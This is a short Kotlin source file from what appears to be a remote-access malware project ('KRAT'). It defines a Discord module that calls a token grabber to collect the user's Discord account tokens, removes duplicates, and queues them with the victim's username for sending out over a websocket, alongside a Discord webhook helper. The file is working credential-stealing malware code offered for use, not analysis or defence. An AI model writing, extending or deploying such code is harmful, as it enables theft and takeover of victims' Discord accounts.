package services

import KRAT.user
import services.discord.TokenGrabber.getTokens
import utils.DiscordWebhook
import utils.ListUtils.removeDuplicates
import websocket.DiscordInformation
import websocket.messagesQueue

object Discord {
    fun webhook(): DiscordWebhook {
        return DiscordWebhook("").apply {
            username = user
        }
    }

    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates()
        if (tokens.isNullOrEmpty()) return

        messagesQueue.add(
            DiscordInformation(
                username = user,
                tokens = tokens
            )
        )
    }
}